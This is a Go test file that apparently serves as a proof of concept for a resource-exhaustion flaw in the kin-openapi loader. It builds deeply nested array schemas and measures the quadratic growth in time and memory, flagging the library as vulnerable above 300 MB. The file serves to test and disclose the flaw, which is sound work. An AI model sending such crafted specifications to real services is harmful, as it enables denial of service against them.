package openapi3_test

import (
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/getkin/kin-openapi/openapi3"
)

func nestedSchemaSpec(d int) string {
	var sb strings.Builder
	sb.WriteString(`{"openapi":"3.0.0","info":{"title":"PoC","version":"1"},"paths":{},"components":{"schemas":{"X":`)
	sb.WriteString(strings.Repeat(`{"type":"array","items":`, d))
	sb.WriteString(`{"type":"string"}`)
	sb.WriteString(strings.Repeat(`}`, d))
	sb.WriteString(`}}}`)
	return sb.String()
}

func measureLoad(d int) (time.Duration, uint64, int) {
	spec := nestedSchemaSpec(d)
	var m0, m1 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m0)
	start := time.Now()
	loader := openapi3.NewLoader()
	_, _ = loader.LoadFromData([]byte(spec))
	el := time.Since(start)
	runtime.ReadMemStats(&m1)
	return el, m1.TotalAlloc - m0.TotalAlloc, len(spec)
}

// A small document with a deeply nested schema forces O(depth^2) re-parsing
// during LoadFromData: every nesting level re-scans/re-decodes its subtree.
func TestPoCSchemaUnmarshalQuadratic(t *testing.T) {
	e1, a1, n1 := measureLoad(1000)
	e2, a2, n2 := measureLoad(2000)
	mb1, mb2 := a1/(1024*1024), a2/(1024*1024)
	t.Logf("depth=1000 (%d B) -> %v, %d MB ; depth=2000 (%d B) -> %v, %d MB (2x depth ~ 4x cost)", n1, e1, mb1, n2, e2, mb2)
	if mb2 > 300 {
		t.Fatalf("VULNERABLE: a %d B document allocated %d MB during load (quadratic; near the ~10000 depth cap a ~250 KB doc reaches tens of GB / tens of seconds)", n2, mb2)
	}
}
